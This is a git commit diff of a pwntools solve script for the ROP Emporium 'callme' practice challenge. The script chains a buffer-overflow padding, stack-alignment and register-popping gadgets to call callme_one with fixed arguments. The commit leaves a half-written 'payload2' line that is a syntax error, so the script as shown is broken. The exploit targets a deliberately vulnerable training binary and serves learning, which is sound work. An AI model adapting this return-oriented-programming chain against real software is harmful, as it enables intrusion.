57ca82eef04c1dc7394f88b34dac835a9877b017
RevenantRobbie <revenantrobbie100@gmail.com>
2026-09-03 15:01:32 -0400

    successfully called callme_one, surely the next ones will be completed more quickly!

--- rop_emporium_all_challenges/callmeChall/solve.py
+++ rop_emporium_all_challenges/callmeChall/solve.py
@@ -6,12 +6,22 @@ chall = gdb.debug("./callme")
 padding = b"A"*40
 stackAligner = p64(0x004007c9)
 callme_oneAddr = p64(0x00400720)
-callme_oneAddr_but_external = p64(0x7bf7e260082e)
-callmePayload = p64(0xdeadbeefdeadbeef) + p64(0xcafebabecafebabe) + p64(0xd00df00dd00df00d)
+callme_twoAddr = p64(0x00400740)
+callme_threeAddr = p64(0x004006f0)
 
+registerGadget = p64(0x000000000040093c) #pops rdi, rsi, and rdx then returns
+callmePayload =  p64(0xdeadbeefdeadbeef) + p64(0xcafebabecafebabe) + p64(0xd00df00dd00df00d) 
 
-finalPayload = padding + stackAligner + callme_oneAddr + callmePayload
+# 1. padding
+# 2. stack align
+# 3. do the register rop (make sure the payload is loaded)
+# 4. stack align AGIAN
+# 5. callme
 
+# payload 1 successfully completes callme_one
+payload1 = padding + stackAligner + registerGadget + callmePayload + stackAligner + callme_oneAddr
 
-chall.sendafter(b"> ", finalPayload)
-chall.interactive()
+payload2 = stackAligner +
+
+chall.sendafter(b"> ", payload1)
+chall.interactive() 
